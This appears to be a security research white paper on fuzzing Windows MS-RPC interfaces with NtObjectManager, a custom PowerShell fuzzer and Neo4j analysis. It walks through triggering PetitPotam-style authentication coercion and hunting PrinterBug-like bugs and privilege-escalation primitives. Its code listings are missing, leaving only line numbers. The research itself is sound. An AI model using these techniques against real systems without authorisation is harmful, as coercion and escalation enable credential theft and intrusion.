+    Client_Runtime->>Server_Runtime: Send Call Packet
+    Server_Runtime->>Server_Stub: Unpack
+    Server_Stub->>Server_App: Call
+
+    %% Return from server application
+    Server_App-->>Server_Stub: Return
+    Server_Stub-->>Server_Runtime: Pack
+    Server_Runtime-->>Client_Runtime: Send Result Packet
+    Client_Runtime-->>Client_Stub: Unpack
+    Client_Stub-->>Client_App: Return
+An RPC interface describes the remote functions that the server program implements. The interface ensures that the client and server communicate using the same rules. It uses the Interface Definition Language (IDL) to create an interface. For example, the MS-EFSR RPC interface ID, which is vulnerable to PetitPotam is df1941c5-fe89-4e79-bf10-463657acf44dAn RPC interface can also have different versions. So there can be a version 1.0 for an RPC interface at some time. And then something in the RPC interface changes and now gets version 2.0.An RPC interface includes the remote functions, or so-called procedures in RPC, that a client can call. Each procedure is uniquely identified by an operation number (opnum). For example, the  procedure (that triggers PetitPotam) has opnum 0 in the MS-EFSR interface. If you are lucky, the procedures for an RPC interface are actually documented by Microsoft, just as with the  procedure. And from this documentation we can see how a procedure is structured and what parameters it expects:This procedure takes 3 input parameters and has 1 output parameter, which we can recognize by  or . We will dive deeper into what the difference is between input and output parameters and what the deal is with . For now, take a look at the second input parameter [in, string] wchar_t* FileName. This parameter takes a string and is stored as a variable called . We can already guess that we should provide a path to a file, according to that variable name.Now that we have a basic idea of what an RPC interface involves and what a procedure is, let’s take a look at how an IDL file is structured. Please take a look at the next piece of code, that is a sample of an IDL file.This should now look very familiar. First we have the RPC interface  specified together with the interface’s version . Next, the procedures are defined, where this example interface has 2 procedures,  with opnum 0 and  with opnum 1.flowchart LR;
+
+a[sample.idl] --> b[MIDL Compiler];
+b --> c["sample_s.c (server stub)"];
+b --> d["sample_c.c (client stub)"];
+b --> e[sample.h]
+
+subgraph MIDL output
+    c
+    d
+    e
+end
+The MIDL returns three files: the client stub file, the server stub file and a header file (.h). The client stub file contains the code that the client application calls to invoke remote procedures. It packages the client’s function calls into network messages, sends them to the server, waits for a response, and then unpacks the response to return to the client. It should get linked with the client application so it can talk to the server using RPC.The client stub file contains the code that the server uses to receive and unpack RPC requests from clients. It unpacks incoming requests, calls the actual implementation of the function on the server, then packages and sends the result back to the client. It should get linked with the server application — it’s like the “translator” that turns RPC messages into local function calls.And lastly, the header file. This contains the function prototypes, constants, and data type definitions shared between client and server. Both client and server use this to understand the interface definition — i.e., what functions exist, their parameters, and their types.We already saw that a procedure can have input parameters and output parameters. An output parameter is necessary when a procedure actually returns something. It can be as simple as an integer or string type. In the example of  this is . This is a context handle. It’s where the server returns a handle to the client after successfully opening the encrypted file.A context handle in RPC is like a session token. It is used when the client needs to make multiple related calls, and the server needs to track progress or hold resources in between. So, the client just holds onto it and passes it back for future operations.In this particular example of , the client asks the server to open an encrypted file . If successful, the server allocates a session/context and returns a handle . The client uses that handle in follow-up calls like  to read the file’s contents.This means that some procedures take an output parameter from another procedure as input parameter. For my automated approach this means complexity, because procedure A should first be called before calling procedure B. But how do we know which procedure outputs a parameter that another procedure takes as input? Let’s not get a hold of ourselves, chapter 6 of this White paper will describe how I managed to solve that problem.In order to connect an RPC client to an RPC server, it will need to know over which endpoint it is reachable. An RPC endpoint is essentially a communication port or address where a server listens for incoming RPC calls. It’s where the RPC server “waits” for a client to contact it. It can be reachable locally using Advanced Local Procedure Call (LPC) endpoints and remotely over a TCP port, UDP port, HTTP (IIS) and also something called a “Named Pipe”.flowchart LR
+    %% Define nodes first
+    P135_TCP["Port 135"]
+    P1026_TCP["Port 1026"]
+    P135_UDP["Port 135"]
+    P1028_UDP["Port 1028"]
+    P139["Port 139"]
+    P445["Port 445"]
+    P80["Port 80 Microsoft IIS"]
+
+    TCP["RPC over TCP"]
+    UDP["RPC over UDP"]
+    NamedPipes["RPC over Named Pipes"]
+    HTTP["RPC over HTTP"]
+    ALPC["Advanced Local Procedure Call"]
+
+    RPCRT4["rpcrt4.dll"]
+
+    Process1["Process with RPC Stub"]
+    Process2["Process with RPC Stub"]
+
+    %% Subgraph: Remote Communication
+    subgraph "Remote Communication"
+        P135_TCP --> TCP
+        P1026_TCP --> TCP
+        P135_UDP --> UDP
+        P1028_UDP --> UDP
+        P139 --> NamedPipes
+        P445 --> NamedPipes
+        P80 --> HTTP
+    end
+
+    %% Subgraph: Local Communication
+    subgraph "Local Communication"
+        ALPC
+    end
+
+    %% Subgraph: RPC Runtime (rpcrt4.dll)
+    subgraph "RPC Runtime (rpcrt4.dll)"
+        TCP --> RPCRT4
+        UDP --> RPCRT4
+        NamedPipes --> RPCRT4
+        HTTP --> RPCRT4
+        ALPC --> RPCRT4
+    end
+
+    %% Subgraph: Target Processes
+    subgraph "Target Processes"
+        RPCRT4 --> Process1
+        RPCRT4 --> Process2
+    end
+As you can see from the above diagram, these “Named Pipes” are initiated over SMB, using the  share. The  share (short for Inter-Process Communication) is a special administrative share in Windows. It’s used to establish a named pipe session to a remote machine.Named pipes are a method for inter-process communication (IPC), letting two processes (which can be on the same machine or different machines) send data back and forth. In Windows, named pipes appear like files, with paths like:  (local) and \\ServerName\pipe\MyPipeName (remote). They’re called “named” because you assign them a name, so other processes can refer to them.I know, I know.. using “files” to set up communication? Well, this makes a nice bridge to chapter three, the Object Manager.Everything in Linux is a file. But in Windows, everything is an object, meaning that every file, process, and thread is represented in kernel memory as an object structure. The Object Manager is the component of the kernel responsible for managing these resource objects, their memory allocations and their lifetimes.flowchart TD
+    %% User Mode
+    UA["User Applications"] --> SCI["System Call Interface"]
+
+    %% System Call Interface layer
+    SCI --> OM["Object Manager"]
+    SCI --> SRM["Security Reference Monitor"]
+    SCI --> MM["Memory Manager"]
+
+    %% Object Manager connections
+    OM -- interacts --> CM["Configuration Manager"]
+    OM -- interacts --> IOM["IO Manager"]
+    OM -- interacts --> PTM["Process/Thread Manager"]
+    OM -- interacts --> ALPC["Advanced Local Procedure Call"]
+
+    %% Other connections
+    MM --> CI["Code Integrity"]
+    SRM --> SCI
+    MM --> SCI
+
+    IOM --> DRIVERS["Drivers / Networking"]
+    PTM --> DRIVERS
+
+    %% Kernel Box
+    subgraph "NTOS Kernel Executive"
+        CM
+        IOM
+        PTM
+        ALPC
+        MM
+        OM
+        SRM
+        SCI
+    end
+
+    %% Drivers (outside core kernel box)
+    DRIVERS
+    CI
+
+    %% Highlight Object Manager
+    style OM fill:#fdd,stroke:#f00,stroke-width:2px
+    style OM fill:#fdd,stroke:#f00,stroke-width:2px,color:#000
+As a typical Windows user, you’re mostly familiar with your file system drives as seen in File Explorer. However, beneath that interface lies an entirely separate file system used by the Windows kernel to manage system objects. This hidden system is known as the Object Manager Namespace (OMNS).The OMNS isn’t widely documented or commonly exposed to developers. It’s organized using Directory objects, which function similarly to folders in a regular file system. Each directory can contain other objects, much like files, but these are not part of the standard file system you’re used to. Each object directory is protected by a security descriptor, which controls who can view its contents or create new objects and subdirectories within it.Some well-known object directories are the  directory and the  directory. The  directory in the OMNS holds kernel-mode representations of hardware and virtual devices. Think of it as the registry of all low-level devices known to the system, like disk drives, keyboards, network adapters, but also the  devices!The  directory contains named objects used by the RPC subsystem, specifically named endpoints for local RPC communication. These are how clients and servers find each other locally when using RPC. One example is the  endpoint for Encrypting File System (EFS).By default, you won’t be able to access the OMNS from user mode easily, but NtObjectManager comes to the rescue.The NtObjectManager PowerShell module wraps native NT system calls and provides cmdlets to interact with the OMNS. It is written by James Forshaw and it is open source! In my opinion, it is one of the best tools for Windows security researchers or individuals looking to get a better understanding of Windows security internals. In this White paper, some of the security internal basics are addressed, but if you want a better understanding, I recommend reading Windows Security Internals by James ForshawTo install the NtObjectManager PS module, just run:With NtObjectManager being installed, PowerShell now includes a lot of cmdlets to access the OMNS. For example, to open a NT Object, we can use .In this example, we opened to the Nt Object named pipe for lsass.NtObjectManager has a few cmdlets that allows to interact with MS-RPC implementations for DLL’s and executables. The  cmdlet parses the RPC servers from a DLL/Executable. If we parse the , which should include an interface that is vulnerable to PetitPotam, we see the following output:Great! It was able to identify two RPC interfaces. The df1941c5-fe89-4e79-bf10-463657acf44d includes 53 procedures. Let’s take a look at the first procedure of for that interface:1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+It’s . And we can see the parameters again that we saw earlier in 1.2 RPC Procedure. We can also take a look at the output parameter for this procedure using:1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+The context handle is described as NdrContextHandleTypeReference in NtObjectManager. The last thing that I will explain about NtObjectManager and interfaces, is that it is able to format the interface into an RPC Client. It does this by getting the source code for an RPC client from a parsed RPC server. And this looks very much like what MIDL compiler does, but in reverse. It also generates the source into . Example:This will output a  (cSharp) file that can be used in Visual Studio to compile a RPC client. For example, the  is defined as follows:1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+Here, marshalling refers to the process of transforming data between managed and unmanaged memory. It is commonly used when you need to interoperate with native code (e.g., using Windows APIs, C/C++ libraries)The  cmdlet creates a new RPC client from a parsed RPC server. The client object contains methods to call RPC methods. To do this we can run:1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+The client starts off disconnected. This is where the endpoints come in.So, in order to connect our RPC client to the RPC server, we will need to specify the endpoint. As we have learned, an RPC server can have multiple endpoints exposed, either locally or remotely accessible. NtObjectManager is able to discover these endpoints in most cases. For example, to get the endpoints for the RPC interface vulnerable to PetitPotam (EFS), we can do the following:This shows that the server has two exposed endpoints. The  endpoint is for LRPC (Local Remote Procedure Call). The  endpoint a named pipe for the  pipe. In order to connect our client, we will need to use the  cmdlet. For example, let’s connect the client over the named pipe using the binding string, which is a combination of the protocol sequence and the endpoint:1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+Now that our RPC client is successfully connected to the RPC server, we can invoke RPC calls.In order to invoke an RPC procedure, we can use the client to see what input parameters it takes, as we need to provide each parameter a valid value. We stay with our example for :We can see that it takes a string and an integer as input parameters, as we already knew. So, let’s provide a remote UNC path and an integer to trigger a Coerce!But this fails. Why? Well remember that every object in the OMNS has a security description. This also counts for the named pipe . And currently, we did not connect our client using proper authentication. In order to connect the client to use the proper authentication level, we can use the  parameter to . This basically encrypts the RPC communication and ensures integrity. We also specify the authentication type with  and we set its value to , which tells to use NTLM (Windows-style) authentication to verify identities.If we now invoke the RPC procedure again, we can see it succeeds!First, it returns the context handle. Second, it shows  for the retval (return value). Which is the Windows message for “Network path not found”.There are multiple approaches to automate MS-RPC security research. One approach is to decompile the server using a Ghidra or Ida connection with perhaps a Model Context Protocol (MCP) and parse the Program database file (PDB) for it. This would be a fair approach, but it would be more time-consuming and complex. Also, this approach relies pure on code analysis, which may raise more false positives and more effort to analyze.Another approach, and the one that I choose, is fuzzing. So far, we used NtObjectManager to collect RPC interfaces from our parsed DLL input, gathered the endpoints, created a client, connected it and invoked an RPC procedure. But this process is automatable.For example, we can create a loop that will gather all string bindings from a user specified directory that includes multiple DLL’s or executables, that may or may not include RPC servers.sequenceDiagram
+    participant User
+    participant PowerShell
+    participant NtObjectManager
+
+    User->>PowerShell: Input target directory (Read-Host)
+    PowerShell->>PowerShell: Store input in $target
+
+    PowerShell->>PowerShell: List *.dll and *.exe in $target
+    PowerShell->>NtObjectManager: Call Get-RpcServer on each file
+    NtObjectManager-->>PowerShell: Return RPC interfaces
+
+    loop For each interface
+        PowerShell->>PowerShell: Extract available binding strings
+        PowerShell->>User: Output binding strings
+    end
+The following code snippet implements the above design in a simple PowerShell script:Specify target > : C:\Users\user\Downloads\blogposts\Automating-MSRPC\
+
+ncacn_np:[\\pipe\\efsrpc]
+ncalrpc:[LRPC-a15516611b501688e1]
+ncacn_np:[\\pipe\\efsrpc]
+ncalrpc:[LRPC-a15516611b501688e1]
+The target has two RPC interfaces that both can be connected to using the same endpoint.This chapter will provide deeper insights in the first phase of the fuzzer: Inventarization. In this phase, the user will provide its targets to the cmdlet . This cmdlet is not included in NtObjectManager, but was developed as an extension. This function will take a NtObjectManager RPC server object as input parameter, or the file path location as target input parameter, and will try to find all endpoints for the RPC interfaces within. Finally, it will export the results into a JSON file that can be parsed to the fuzzer.NtObjectManager tries its best to collect the available endpoints for an RPC interface. However, it is sometimes not able to do identify endpoints. This could be because the Windows service is simply not running. But, there are cases where the Windows service is running, but NtObjectManager cannot find them directly.James Forshaw wrote a blog about this problem and suggests a few solutions. NtObjectManager includes a cmdlet  which gets the endpoints for an RPC interface from the local endpoint mapper. However, it also includes the -FindAlpcPort command to try and brute force an ALPC port for the interface.In most cases, it is enough to use  to determine if an RPC interfaces exposes any endpoints. If not, we can assume that there is a Windows service that is not running. But in some rare cases, the service is running, but no endpoints could be discovered, either my the endpoint mapper or brute force.One thing we can do is guess for named pipe endpoints. This will be our last option to discover endpoints. In this case, we will try to connect our RPC client using a few named pipes. If it connects, great! If not, it determines that there are no endpoints.flowchart TD
+    A[NtObjectManager tries to collect RPC endpoints] --> B{Endpoints found?}
+    
+    B -- Yes --> C[Done - Endpoints discovered]
+    B -- No --> D[Use Get-RpcEndpoint with local endpoint mapper]
+    
+    D --> E{Endpoints found?}
+    E -- Yes --> C
+    E -- No --> F[Use -FindAlpcPort to brute force ALPC port]
+    
+    F --> G{Endpoints found?}
+    G -- Yes --> C
+    G -- No --> H[Try guessing named pipe endpoints]
+    
+    H --> I{Connection successful?}
+    I -- Yes --> C
+    I -- No --> J[No endpoints could be discovered]
+
+    style A fill:#f9f,stroke:#333,stroke-width:1.5px,color:#000
+    style C fill:#bbf,stroke:#333,stroke-width:1.5px,color:#000
+    style J fill:#faa,stroke:#333,stroke-width:1.5px,color:#000
+
+One downside of using  is that is very expensive in terms of time. To provide efficient fuzzing, the endpoints, specifically the string bindings of the user’s provided targets RPC interface(s), will be exported to a JSON file.The structure for this JSON file looks like:1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+This JSON file will be exported to a user provided path. This JSON file can be parsed as input parameter for the fuzzer. An advantage of this is when something does wrong in the fuzzing process, or we want to adjust how we fuzz, we don’t have to go over phase 1 one again.The fuzzer can be invoked using the  cmdlet. It takes the exported JSON file from the RPC data gathering phase as input. First, the fuzzer will create and connect an RPC client using the binding strings from the parsed JSON file. In the fuzzing process, there are some rather complex problems to solve.The first problem is parameters and a parameter its input value. This is also the most important factor for the fuzzer, because it will need to contain a value that will hopefully identify vulnerabilities. For fuzzing web applications this is a rather easy step, we can just always send strings. But for MS-RPC, there are more parameter types than just strings.First, let’s sum up what kind of types we can run into and some examples.Primitives and Value TypesArrays and CollectionsObject and Reflection TypesNullable TypesSystem.Nullable`1[System.Int32]System.Nullable`1[System.Guid]We don’t need or even can provide each type with a value. The most important types for the fuzzing are the primitives, value types and arrays. We can provide these with random values with different sizes or lengths.The struct type is kind of special, because it can consist of multiple primitives types, arrays or objects. So we should loop over the array to fill in those values. In summary, we should implement two functions: One function  will be responsible for extracting all parameters of a Method (procedure) and will call the other function  to provide it a value.Some types are “complex” and we cannot provide them a value. A “complex” type in most cases means that it expects an input parameter that was given as output parameter by another procedure. However, we will need to provide the procedure the right format parameter if we want to fuzz it. For example, when a procedure takes a string input parameter and a complex input parameter, we still want to fuzz the string input for that procedure.To solve this, we can dynamically create an instance for the parameter using PowerShell reflection:The “complex” parameter type will most likely be provided with a value that the RPC server will reject, because it expects some kind of value. However, this will provide us with the right parameter type so that we can still fuzz the other input parameters like strings!flowchart TD
+    A[Call Format-DefaultParameters for a Method] --> B[Call Format-ParameterType for each parameter type]
+    
+    B --> F{Type is primitive, value type, or array?}
+    F -- Yes --> G[Generate random value of appropriate size/length]
+    F -- No --> H{Type is struct?}
+    
+    H -- Yes --> I[Loop over struct members]
+    I --> J[Call Format-ParameterType recursively for each member]
+    
+    H -- No --> K{Type is complex}
+    K -- Yes --> L[Create instance using PowerShell reflection]
+    K -- No --> M[Skip or provide default/null value]
+
+    G --> N[Return value to Format-DefaultParameters]
+    J --> N
+    L --> N
+    M --> N
+    N --> O[Assemble complete parameter set]
+    O --> P[Use parameters for fuzzing input]
+
+    style A fill:#eef,stroke:#333,stroke-width:1.5px,color:#000
+    style P fill:#bfb,stroke:#333,stroke-width:1.5px,color:#000
+    style L fill:#ffd,stroke:#333,stroke-width:1.5px,color:#000
+    style M fill:#fcc,stroke:#333,stroke-width:1.5px,color:#000
+As mentioned before, when we specify the right parameter type for a “complex” parameter, but with an other value than that the RPC server expects, a lot of times this results in an error. An error that a lot of times is being returned is:The stub received bad data
+Also, if we look at the PrinterBug vulnerability, it needs to make two procedure calls to trigger the vulnerability.In this case, the RpcRemoteFindFirstPrinterChangeNotificationEx procedure expects a context handle input parameter of the opened printer. If we just send a random context handle, it will result in the The stub received bad data error. In terms of vulnerability research, we will miss a lot of possible vulnerabilities like PrinterBug if we assume that we only need one procedure to trigger a vulnerability.To provide the security researcher some insights into which procedure provides the necessary output parameter for a procedure as input parameter, we will need to dive into more .NET reflection.We will first need to find all “complex” output parameters for a method. A method is the procedure object in PowerShell.When we have specified the method object, we can now look for it’s return types:1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+We can see that the  here is NtCoreLib.Ndr.Marshal.NdrContextHandle. This is essentially the parameter type that we wanted to know. However, a procedure can provide multiple output parameters:Since we only need “complex” parameter types, we just want to store the  for this procedure. To do this, we can apply some filters and retrieve the name of the procedure, the position of the parameter and the type.Now we know that  returns a  as output parameter, we should look for procedures that need this as input parameter, within the same RPC interface.1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+We loop over all the parameters for a method. This loop is inside another loop that loops over all methods in an RPC interface. We only need complex types, so we exclude types that are a string or integer.We export both input and output parameters to a JSON file. The user only needs to provide the RPC interfaces to the cmdlet .The JSON file looks like so:1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+In chapter 7, this White paper will describe how we can use Neo4j to easily find the relations between procedures which depend on each other’s parameters. For now, a researcher can provide the fuzzer with an array of complex input parameters. When provided, the fuzzer will not create parameter types that are already provided by the user.The process of preparing the parameter types and values for the fuzzer now looks like so:flowchart TD
+    A[Call Format-DefaultParameters for a Method] --> B[Call Format-ParameterType for each parameter type]
+    
+    B --> F{Type is primitive, value type, or array?}
+    F -- Yes --> G[Generate random value of appropriate size/length]
+    F -- No --> H{Type is struct?}
+    
+    H -- Yes --> I[Loop over struct members]
+    I --> J[Call Format-ParameterType recursively for each member]
+    
+    H -- No --> K{Type is complex}
+    K -- Yes --> Q{Is user input provided?}
+    
+    Q -- Yes --> R[Parse user-provided parameter directly]
+    Q -- No --> L[Create instance using PowerShell reflection]
+    
+    K -- No --> M[Skip or provide default/null value]
+
+    G --> N[Return value to Format-DefaultParameters]
+    J --> N
+    R --> N
+    L --> N
+    M --> N
+    N --> O[Assemble complete parameter set]
+    O --> P[Use parameters for fuzzing input]
+
+    style A fill:#eef,stroke:#333,stroke-width:1.5px,color:#000
+    style P fill:#bfb,stroke:#333,stroke-width:1.5px,color:#000
+    style L fill:#ffd,stroke:#333,stroke-width:1.5px,color:#000
+    style R fill:#cfc,stroke:#333,stroke-width:1.5px,color:#000
+    style M fill:#fcc,stroke:#333,stroke-width:1.5px,color:#000
+Now, the fuzzer should be able to find the PrinterBug vulnerability. This definitely can be improved in future work, by automating the whole process. It would be great if the fuzzer itself knows which procedures to call first before invoking the procedure that depends on the other procedure’s output parameters.Once we determined that the parameter type can be provided with a value, either standalone or within a structure, we introduce a new function . This function can be parsed with parameters like minimal string length or minimal integer size. The function takes the parameter type as value and then uses random to generate the input. As an example, the case for a  parameter type is given:You may notice the  variable. This is a important deal for the fuzzer to know where our input landed and determine relationships.The canary method is used to expose an information leak by giving different versions of a sensitive document of several suspects and seeing which version gets leaked. In our case, for string parameter types, we send a recognizable string and attach a random value to it. Example:To find the information leak (know where our input lands in the background), we will need a tool that can monitor processes in the background of the Windows system. The ideal tool for this is Process Monitor. Process Monitor is an advanced monitoring tool for Windows that shows real-time file system, Registry and process/thread activity.While having Process Monitor listening in the background, we can start our fuzzer. When we apply a filter in Process Monitor that includes our recognizable part of the string e.g. , we can see where our fuzzing input landed and what kind of function calls are being made with our input.Process Monitor with canary as applied filterA user can now export the Process Monitor results into a CSV file. The fuzzer provides the  cmdlet to import the data into Neo4j. More about this in Chapter 7.While the fuzzer is running, it will store the results into separate JSON files. These are allowed.json, denied.json and error.json, depending on the result. The structure of the allowed json file looks so:1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+It stores the input, the output and windows message according to the integer found in the output. But this json file can easily get as big as 50.000 lines. Also, from a JSON structure it is quite hard to see the relations. This calls for a solution that can provide us with tooling that makes analysis easy.A great blog post from @xpn gave me the idea to use Neo4j to analyze the fuzzing results. To import our JSON files to a (remote) Neo4j database, I wrote a custom Neo4j wrapper. The user can provide the JSON file and pipe it to the cmdlet : calls another function Add-AllowsFuzzedInputNodeFromJson that will format the JSON structure and send it to another function Add-AllowsFuzzedInputNode that will create the Cypher query. This is necessary if we want to import the data to Neo4j. To give you an idea about how this looks, the following function is used to import the Allowed.json file into Neo4j:1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+ here is simply another function that will make the HTTP(S) request to the (remote) Neo4j database, including the cypher query. The following graph shows how this part of the tool works.flowchart TD
+    %% User input phase
+    subgraph User Input
+        A["User provides JSON file<br>('Allowed.json')"]
+        B["Pipe to Import-DataToNeo4j cmdlet"]
+        A --> B
+    end
+
+    %% Processing pipeline
+    subgraph Cmdlet Processing
+        B --> C["Import-DataToNeo4j"]
+        C --> D["Call Add-AllowsFuzzedInputNodeFromJson"]
+        D --> E["Parse and format JSON structure"]
+        E -->|Success| F["Call Add-AllowsFuzzedInputNode"]
+        E -->|Failure| E_ERR["Log JSON parsing error<br>and exit"]
+    end
+
+    %% Cypher query generation
+    subgraph Cypher Construction
+        F --> G["Construct Cypher query from JSON fields"]
+        G -->|Success| H["Invoke-CustomNeo4jQuery"]
+        G -->|Failure| G_ERR["Log Cypher generation error<br>and exit"]
+    end
+
+    %% Neo4j communication
+    subgraph Neo4j Communication
+        H --> I["Send Cypher via HTTP(S) to Neo4j"]
+        I -->|Success| J["Neo4j processes query and updates graph"]
+        I -->|Failure| I_ERR["Log Neo4j communication error<br>and exit"]
+    end
+
+    %% Error node styles
+    style E_ERR fill:#ffdddd,stroke:#a00,stroke-width:1.5px,color:#000
+    style G_ERR fill:#ffdddd,stroke:#a00,stroke-width:1.5px,color:#000
+    style I_ERR fill:#ffdddd,stroke:#a00,stroke-width:1.5px,color:#000
+
+    %% Node styles
+    style A fill:#e0f7fa,stroke:#333,stroke-width:1.5px,color:#000
+    style B fill:#e0f7fa,stroke:#333,stroke-width:1.5px,color:#000
+    style C fill:#f1f8e9,stroke:#333,stroke-width:1.5px,color:#000
+    style D fill:#f1f8e9,stroke:#333,stroke-width:1.5px,color:#000
+    style E fill:#f1f8e9,stroke:#333,stroke-width:1.5px,color:#000
+    style F fill:#fff3e0,stroke:#333,stroke-width:1.5px,color:#000
+    style G fill:#fff3e0,stroke:#333,stroke-width:1.5px,color:#000
+    style H fill:#e8eaf6,stroke:#333,stroke-width:1.5px,color:#000
+    style I fill:#e8eaf6,stroke:#333,stroke-width:1.5px,color:#000
+    style J fill:#c8e6c9,stroke:#333,stroke-width:1.5px,color:#000
+A similar structure is used for import access.json and error.json, but also for the parameters.json file that was generated by  as explained in Chapter 6.2.By default, the tool creates a few nodes and relations based on the given input data. The nodes are:RpcServer
+RpcInterface
+Endpoint
+Method
+AllowsInput
+AccessDenied
+Error
+Parameter
+FunctionCall
+highPrivilegedFileOp
+ACL
+The relations between the nodes can be:HAS_INTERFACE
+WITH_METHOD
+HAS_ENDPOINT
+EXPOSES_METHOD
+CONSUMES
+PRODUCES
+OUTPUTS
+INPUTS
+CALLS_FUNCTION
+HIGH_PRIVILEGED_FILE_OP
+HAS_ACL
+In Neo4j, we can now show relations between our data by making Cypher queries. For example, the following query will show the relation between the RPC server, interfaces, endpoints, methods and the allowed RPC calls.Neo4j now shows the relations, for example: Relations between the RPC server, interfaces, endpoints, methods and the allowed RPC calls in Neo4jWith this, we can also easily map service crashes!The above cypher query shows the relation between an RPC interface, fuzzing input that caused an error and crashes a service in Windows.Relation between fuzz input that causes a service crash in Neo4jIn chapter 6.4, this post explained how a canary is used to determine where fuzz input lands in the background in Windows. Using Neo4j cypher queries, we can now show the relation between our fuzz input and the function call that we exported using Process Monitor:The way this works is by looking at the  value of the Process Monitor events and map the value to the fuzzing input. If they are the same we know which RPC procedure made the function call:Relations between the RPC server, interfaces, endpoints, the fuzzing input and function calls in Neo4jWith this extra data, we can now also map registry writes:Or we can map for “High Privileged File Operations” which is a rule that I wrote when:The operation includes “file”The idenitity is either high privileged without using any impersonation OR the identitiy is not high privileged, but is impersonating a high privileged identity to make the callWith this you can easily spot coerce vulnerabilities or privilege escalation primitives ;).Remember that in chapter 6.2 the post explained how the  cmdlet exports a JSON file that can also be imported to Neo4j. This allows to easily analyze which procedures depend on each other in terms of input/output parameters.With the parameters imported, we can now look for procedures that provide the RpcRemoteFindFirstPrinterChangeNotificationEx procedure the necessary input parameter and limit the results to 3 procedures:1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+The following image shows the result of the above query: Procedures that can provide RpcRemoteFindFirstPrinterChangeNotificationEx with the right input parameter, mapped in Neo4jIn the previous chapters this post explained most of the functionality of the tool and which problems the tool overcomes. This chapter will provide an overall insight about the program’s structure.The tool will be open sourced soon (after graduating).The tool has three phases: Inventorize, Fuzzing, Analysis. The three most important functions are phase 1: , Phase 2 fuzzing:  and Phase 3: . All are provided to the user as cmdlets in PowerShell.graph TD
+    User([User])
+
+    %% Input and output styling
+    classDef input fill:#d4fcd4,stroke:#2b8a3e,stroke-width:2px,color:#000;
+    classDef output fill:#fff3cd,stroke:#ffbf00,stroke-width:2px,color:#000;
+
+    %% Phase 1: Gather RPC Interfaces
+    User --> A1[Get-RpcServerData]
+    A1 --> A2[Target Specified or Default]
+    A2 --> A3[rpcServerData.json]
+    A3 --> B1[Invoke-RpcFuzzer]
+
+    %% Phase 2: Fuzzing
+    B1 --> B2[log.txt Call History]
+    B1 --> B3[allowed.json]
+    B1 --> B4[denied.json]
+    B1 --> B5[error.json]
+
+    %% All fuzzer outputs used in Phase 3
+    B3 --> C1[Import-DataToNeo4j]
+    B4 --> C1
+    B5 --> C1
+
+    %% Phase 3: Analysis
+    C1 --> C2[Neo4j Database]
+    C2 --> C3[Graph Visualization & Querying]
+
+    %% Apply styling
+    class A3 input;
+    class B3,B4,B5,B2 output;
+
+    %% Labels for clarity
+    subgraph Phase1 [Phase 1: Gather RPC Interfaces]
+        A1
+        A2
+        A3
+    end
+
+    subgraph Phase2 [Phase 2: Fuzzing]
+        B1
+        B2
+        B3
+        B4
+        B5
+    end
+
+    subgraph Phase3 [Phase 3: Analysis]
+        C1
+        C2
+        C3
+    end
+First, specify target and get RPC interfaces and RPC endpoints for the target. The user can specify a file path or a NtCoreLib.Win32.Rpc.Server.RpcServer object (which NtObjectManager gives with Get-RpcServer). This will output a JSON file , which the user can parse to the fuzzer. If there is no target specified, it will default to all .exe and .dll in %systemdrive%\Windows\System32\The fuzzer takes the exported JSON file by  as required input. The fuzzer will output maximal 3 json files and one log file. It will write the RPC calls before invoking them to , this way if there is a crash (BSOD), the user will know which call was responsible (last line) It will separate the fuzz results into 3 json files:Fuzzed inputs that lead to a Access DeniedFuzzed inputs that lead to a ErrorThe user can use these JSON files for analysis as he likes. However, the fuzzer has an option to import them into your Neo4j instance using the  cmdlet. The fuzzer has a data mapper that makes relations for the data.The whole idea is to gain insights into MS-RPC implementations that may be vulnerable using an automated approach and make it easy to visualize the data. By following this approach, a security researcher will hopefully identify interesting RPC services in such a time that would take a manual approach significantly more.And so, the tool was put to the test. The tool was tested against the Canary Channel build of Windows Insider Preview build: 27774.1000.amd64fre.rs_prerelease.250111-1221.Not all vulnerabilities were publicly disclosed, so some lack details.BSides Groningen, May 2nd 2025The results of chapter 9.1, are in my opinion only the tip of the iceberg of vulnerabilities that can be discovered using this approach. A big surface has not been properly analyzed. And that surface is for RPC procedures that rely on another procedure’s output parameter.Iceberg that shows how big of an attack surface is not yet researchedThis currently needs some form of manual interaction, by first mapping the procedure’s their parameters and finding which procedures provide the output parameters for most of the other procedures within that same RPC interface. When found, the user should make the RPC call manually and store the output parameter inside a variable. This variable should be parsed to the fuzzer to properly fuzz the procedures that require them. This surface simply takes more time to research. Perhaps there is a smart way to automate this process too.In most cases, the tool is able to find the endpoints for an RPC interface (if available). But in some cases it cannot find endpoints and determines that there are none or others. RpcView is better at determining endpoints for interfaces in real-time for several reasons. One of them being that endpoints close and open all the time. We only gather endpoints for a specific moment.For now, I recommend that when you find a vulnerability that can be exploited over ALPC endpoints, but not remotely (named pipes), to run RpcView as admin and check the RPC interface for other possible endpoints.Comparing fuzzing results between different OS versions is also something that in my opinion can result in some very interesting results. The tool currently has no option to compare the data, but one thing you can do is create two different Neo4j databases and compare the results there. You likely want to filter for procedures that on one version result in an error and on the other version in a normal response.The Process Monitor implementation is not ideal. A solution towards ETW with .NET and Microsoft.Diagnostics.Tracing.TraceEvent to monitor system calls would be better. It should also be possible to fully integrate this into the tool while fuzzing. Currently the tool doesn’t have to be ran as administrator. To monitor system calls using Microsoft Diagnostics, we will need access to the kernel and this requires administrative privileges. This is something to take into consideration. For now, 